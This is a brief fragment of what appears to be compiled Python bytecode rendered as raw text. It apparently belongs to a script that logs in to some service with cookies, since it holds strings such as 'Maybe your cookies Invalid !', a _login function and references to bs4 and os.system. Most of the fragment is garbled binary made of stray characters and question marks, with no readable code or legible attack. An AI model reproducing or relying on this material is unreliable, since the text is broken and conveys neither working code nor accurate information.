z	COOKIES: r   z  ! Maybe your cookies Invalid ! r   )rg   ?readr?   rk   ?FileNotFoundErrorr`   ?mkdirrc   r9   r&   rb   r?   rR   r?   )r%   rH   ZSuccessr   r   r	   ?_login?  s    (?r?   ?__main__)#?__doc__r   r   r`   ?randomr?   Zbs4r   r   Zconcurrent.futuresr   r   r(   ?systemr
   r?   r?   ?Hr?   ?Br6   rd   r?   r?   r?   rA   rJ   r&   r*   rF   rG   rp   r?   r?   rl   r   r   r   r	   ?<module>   s@   (
 ;	]_6 ?
?